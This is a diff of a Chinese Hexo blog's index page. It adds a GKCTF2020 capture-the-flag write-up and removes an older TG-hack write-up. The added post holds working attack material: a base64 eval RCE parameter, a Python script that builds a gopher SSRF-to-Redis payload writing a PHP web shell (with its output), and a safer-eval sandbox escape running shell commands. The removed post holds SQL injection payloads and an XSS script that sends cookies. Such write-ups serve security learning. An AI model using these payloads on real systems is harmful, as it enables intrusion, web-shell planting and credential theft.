@@ -198,6 +198,223 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c12b792b.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d5c12b792b.html" class="post-title-link" itemprop="url">GKCTF2020-CheckIN</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-27 16:21:20" itemprop="dateCreated datePublished" datetime="2020-05-27T16:21:20+08:00">2020-05-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:24:56" itemprop="dateModified" datetime="2020-10-14T17:24:56+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>base64加密一下可以直接RCE：</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></pre><p>测试发现<code>tmp</code>目录是可以写东西。但是直接读flag是没法读得。但是发现有readflag这个程序在根目录，但是这里把执行系统命令的函数都给禁了，这里要bypass 一下<code>disable function</code>.</p>
+<p>直接exp一把梭：</p>
+<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
+<p>exp上传到/var/tmp/3.txt,直接包含执行就行了。</p>
+<pre><code>http://ebd8d9e8-ee16-4153-8396-b65d3b3b95ac.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX0dFVFsnYSddKTs=&amp;a=var_dump(include(&#39;../../tmp/3.txt&#39;));</code></pre><blockquote>
+<p> echo pwn(“echo <code>/readflag</code> &gt; /var/tmp/a.txt”);</p>
+</blockquote>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200526145744.png" alt="微信图片_20200526145744"></p>
+<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>直接网上搜shopX0 getshell <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
+<p>那道shell之后呢，发现根目录下的flag是假的，还有个hint。不知道这个hint有啥用，但是在auto.sh有一个很明显的地方</p>
+<pre><code>#!/bin/sh
+while true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done</code></pre><p>这里应该设定了定时任务每60秒执行一次这个脚本，而且这个makeflaghint.py 脚本我们有权限修改。我们直接修改脚本就能读到/root/flag。</p>
+<pre><code class="python">f = open(&#39;/root/flag&#39;,&#39;r&#39;)
+f2 = open(&#39;/666.txt&#39;,&#39;w&#39;)
+flag = f.read()
+f2.write(flag)
+f.close()
+f2.close()</code></pre>
+<h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这道题和安恒还是广东强网某道题基本一样。也是SSRF打Redis.</p>
+<p>SSRF对内网IP进行探测然后对端口探测发现是Redis，然后EXP一把梭。</p>
+<pre><code class="python">import urllib
+import urllib.parse
+protocol=&quot;gopher://&quot;
+ip=&quot;173.138.94.11&quot;
+port=&quot;6379&quot;
+shell=&#39;\n\n&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;\n\n&#39;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.parse.quote(redis_format(x))
+    print(payload)</code></pre>
+<pre><code>gopher://173.138.94.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></pre><p>最后读flag需要绕一下空格。</p>
+<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
+const bodyParser = require(&#39;body-parser&#39;);
+
+const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库
+
+const fs = require(&#39;fs&#39;);
+
+const app = express();
+
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+// 2020.1/WORKER2 老板说为了后期方便优化
+app.use((req, res, next) =&gt; {
+  if (req.path === &#39;/eval&#39;) {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) {
+      delay = Math.max(delay, parseInt(req.query.delay));
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try {
+        res.send(&#39;Timeout!&#39;);
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});
+
+app.post(&#39;/eval&#39;, function (req, res) {
+  let response = &#39;&#39;;
+  if (req.body.e) {
+    try {
+      response = saferEval(req.body.e);
+    } catch (e) {
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    }
+  }
+  res.send(String(response));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get(&#39;/source&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.js&#39;));
+});
+
+// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
+app.get(&#39;/version&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./package.json&#39;));
+});
+
+app.get(&#39;/&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.html&#39;))
+})
+
+app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
+  console.log(&#39;Start listening&#39;)
+});</code></pre>
+<h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><ul>
+<li><p>setTimeout ，整数溢出，Infinity或者 ⼤于 2147483647</p>
+</li>
+<li><p>safeval <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a></p>
+</li>
+</ul>
+<pre><code>setInterval.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString();</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200527142405.png" alt="微信截图_20200527142405"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d729d7601d.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2002,143 +2219,6 @@ enctype=&quot;multipart/form-data&quot;&gt;
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6b507308d.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d6b507308d.html" class="post-title-link" itemprop="url">TG-hack CTF Write Up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-04-12 15:34:45" itemprop="dateCreated datePublished" datetime="2020-04-12T15:34:45+08:00">2020-04-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:12:31" itemprop="dateModified" datetime="2020-10-14T17:12:31+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
-<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
-<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
-<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
-</blockquote>
-<p>FLAG in a JavaScript File.</p>
-<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
-<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
-<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we haven’t been able to secure the funds necessary to do so. Can you help us?</p>
-<ul>
-<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
-</ul>
-</blockquote>
-<p>O-M-G,I regret it very much.😂My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692758656.png" alt="img"></p>
-<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
-<p>e g:</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866688491552.png" alt="img"></p>
-<p>And then,it happened that is amazing!We have more money!</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866691878335.png" alt="img"></p>
-<p>OK，we can buy the flag….</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692306869.png" alt="img"></p>
-<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
-<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
-<p>Little bobby forgot his password. Can you help him log in?</p>
-<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
-</blockquote>
-<p>I didn’t find any bugs in this container at 1st😭.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866718226965.png" alt="img"></p>
-<p>We can know that it’s a update sql and we can control a  param .</p>
-<p>eg:</p>
-<blockquote>
-<p>update table set column=’param’ where ……</p>
-</blockquote>
-<p>1st,I want to commented out “where“ and I write payload like the following . But it can ‘t change passwd and throw me an error…..</p>
-<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866726963625.png" alt="img"></p>
-<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
-<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866730992987.png" alt="img"></p>
-<p>And then , we changed this admin’s pass,we can get flag, when we login.</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866731884985.png" alt="img"></p>
-<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
-<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
-<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
-<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
-</blockquote>
-<pre><code class="javascript">&lt;script&gt;
-let xhr = new XMLHttpRequest();
-xhr.open(&quot;post&quot;, window.location.href, true);
-xhr.send(document.cookie);
-&lt;/script&gt;</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2210,7 +2290,7 @@ xhr.send(document.cookie);
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2281,12 +2361,12 @@ xhr.send(document.cookie);
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">229k</span>
+    <span title="站点总字数">231k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:30</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
